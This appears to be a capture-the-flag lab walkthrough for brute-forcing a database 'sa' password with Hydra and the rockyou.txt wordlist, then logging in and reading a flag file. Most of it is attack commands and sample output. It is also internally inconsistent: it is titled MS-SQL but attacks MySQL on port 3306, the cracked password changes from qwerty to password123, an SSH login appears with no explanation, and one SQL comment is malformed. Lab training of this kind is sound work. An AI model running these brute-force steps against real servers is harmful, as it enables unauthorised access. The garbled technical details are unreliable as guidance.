# Lab 6.4: MS-SQL Credential Brute Force
## Learning Objectives
- Brute force MS-SQL credentials
- Use Hydra for database brute forcing
- Capture the flag
## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before starting brute force.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify MySQL service is running:**
   ```bash
   nmap -p 3306 <target_ip>
   ```

### Step 2: Brute Force

Use Hydra to brute force MySQL credentials.

**Detailed Steps:**

1. **Verify Hydra is installed:**
   ```bash
   which hydra
   hydra -h
   ```

2. **Prepare password wordlist:**
   ```bash
   # Use rockyou.txt (large wordlist)
   ls -la /usr/share/wordlists/rockyou.txt
   
   # Or create smaller wordlist for faster testing
   echo -e "password\nadmin\nadmin123\nqwerty\n123456\npassword123" > wordlist.txt
   ```

3. **Run Hydra brute force attack:**
   ```bash
   hydra -l sa -P /usr/share/wordlists/rockyou.txt mysql://<target_ip>
   ```
   
   Replace `<target_ip>` with your actual target IP (e.g., `hydra -l sa -P /usr/share/wordlists/rockyou.txt mysql://<target_ip>`)

   **Command breakdown:**
   - `hydra`: Brute force tool
   - `-l sa`: Single username to test (lowercase L) - sa = system administrator
   - `-P /usr/share/wordlists/rockyou.txt`: Password wordlist (uppercase P)
   - `mysql://<target_ip>`: MySQL protocol and target IP

4. **Expected output:**
   ```
   Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak
   Hydra starting at 2024-01-15 10:30:00
   [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344391 login tries (l:1/p:14344391), ~896524 try per task
   [DATA] attacking mysql://<target_ip>:3306/
   [3306][mysql] host: <target_ip>   login: sa   password: qwerty
   [STATUS] attack finished for <target_ip> (waiting for children to complete tests)
   1 of 1 target successfully completed, 1 valid password found
   ```

5. **Key information from output:**
   - **Valid password found**: `password: qwerty`
   - **Login**: `sa`
   - **Target**: `<target_ip>`

6. **Alternative: Use smaller wordlist for faster testing:**
   ```bash
   head -1000 /usr/share/wordlists/rockyou.txt > wordlist.txt
   hydra -l sa -P wordlist.txt mysql://<target_ip>
   ```

**Troubleshooting:**
- If Hydra is slow, use smaller wordlist
- Try with verbose output: `hydra -V -l sa -P wordlist.txt mysql://<target_ip>`
- Reduce parallel connections: `hydra -t 1 -l sa -P wordlist.txt mysql://<target_ip>`
- Verify MySQL service is running on port 3306

### Step 3: Connect

Use the discovered password to connect to the MySQL database.

**Detailed Steps:**

1. **Connect with discovered credentials:**
   ```bash
   mysql --ssl-verify-server-cert=0 -h <target_ip> -u sa -p
   ```
   
   Replace `<target_ip>` with your actual target IP.

2. **Enter password when prompted:**
   ```
   Enter password:
   ```
   
   Type the password discovered by Hydra (e.g., `password123`)

3. **Expected successful connection:**
   ```
   Welcome to the MySQL monitor.  Commands end with ; or \g.
   Your MySQL connection id is 123
   Server version: 8.0.33 MySQL Community Server
   
   mysql>
   ```

4. **Verify connection:**
   ```sql
   SELECT VERSION();
   ```

5. **Exit MySQL client:**
   ```sql
   exit
   ```

### Step 4: Access Flag

The flag is located in /tmp/flag.txt on the database server.

**Detailed Steps:**

1. **If you have shell access:**
   ```bash
   ssh admin@<target_ip>
   # Password: password
   ```

2. **Navigate to flag location:**
   ```bash
   cat /tmp/flag.txt
   ```

3. **Expected flag content:**
   ```
   OCR{mssql_brut3}
   ```

4. **Alternative: Check if flag is in database:**
   ```sql
  ; If still connected to MySQL
   SELECT * FROM information_schema.tables WHERE table_name LIKE '%flag%';
   ```

5. **Verify file exists:**
   ```bash
   ls -la /tmp/flag.txt
   ```

### Step 5: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{mssql_brut3}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Verified target IP and MySQL service accessibility
- ✅ Prepared password wordlist (rockyou.txt or custom)
- ✅ Ran Hydra brute force attack against MySQL service
- ✅ Discovered valid password for sa user
- ✅ Successfully connected to MySQL with discovered credentials
- ✅ Successfully accessed flag in /tmp/flag.txt
- ✅ Verified flag format is correct: `OCR{...}`

**Key Learning Points:**
- Hydra automates database password brute forcing
- sa (system administrator) is a common target account
- Wordlists should contain common passwords
- Understanding Hydra output helps identify successful credentials
- Always verify discovered credentials by connecting manually
## Hints
1. Username: sa
2. Use hydra for MySQL
3. Password in common wordlists